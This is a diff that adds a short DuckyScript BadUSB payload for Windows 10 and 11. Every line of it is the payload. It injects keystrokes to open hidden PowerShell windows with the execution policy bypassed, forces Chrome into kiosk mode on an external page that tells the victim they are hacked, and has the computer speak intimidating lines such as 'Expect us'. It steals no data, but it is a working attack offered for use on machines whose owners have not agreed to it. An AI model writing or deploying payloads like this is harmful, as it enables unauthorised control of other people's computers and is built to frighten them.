@@ -1,0 +1,14 @@
+REM     Title: dont be afraid
+
+REM     Author: ncrypted user
+
+REM     Description: This payload is meant to open a page saying your hacked and it says dont be afrade
+
+REM     Target: Windows 10, 11
+
+GUI r
+STRING powershell -w hidden -NoP -NonI -Exec Bypass -Command "Start-Process 'chrome.exe' -ArgumentList '--kiosk https://kingtoad-c.github.io/bad-usb/'"
+ENTER
+GUI r
+STRING powershell -w hidden -NoP -NonI -Exec Bypass -Command "$s=New-Object -ComObject SAPI.SpVoice;$s.Rate = -2;$s.Speak('dont be afraid');$s.Speak('just follow the rules');$s.Speak('and everything will be okay');$s.Speak('Expect us')"
+ENTER
